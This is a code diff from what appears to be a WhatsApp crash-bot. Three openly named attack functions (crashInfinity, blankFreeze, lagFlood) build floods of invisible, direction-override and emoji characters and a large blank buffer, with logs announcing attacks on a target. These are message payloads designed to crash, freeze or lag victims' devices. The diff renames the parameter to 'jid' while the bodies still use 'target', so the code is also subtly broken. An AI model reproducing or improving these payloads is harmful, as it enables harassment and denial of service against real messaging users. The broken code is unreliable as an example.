@@ -229,7 +229,7 @@ async function pairDevice(sessionId, phoneNumber) {
 }
 
 // ==================== BUG FUNCTIONS ====================
-async function crashInfinity(target, sock) {
+async function crashInfinity(jid, sock) {
     const invisibleForce = "‎".repeat(50000);
     const fakeImage = Buffer.alloc(200000);
 
@@ -284,7 +284,7 @@ async function crashInfinity(target, sock) {
     }
 }
 
-async function blankFreeze(target, sock) {
+async function blankFreeze(jid, sock) {
     const ghostPayload = "‌".repeat(10000) + "‎".repeat(10000) + "⿈".repeat(5000);
     console.log(chalk.yellow(`[!] Injecting Blank-Freeze to: ${target}`));
 
@@ -319,7 +319,7 @@ async function blankFreeze(target, sock) {
     }
 }
 
-async function lagFlood(target, sock) {
+async function lagFlood(jid, sock) {
     const chaosText = "🥵".repeat(1000) + "‮".repeat(5000) + "‎".repeat(5000);
     console.log(chalk.blue(`[!] Launching Lag-Flood Attack to: ${target}`));
 
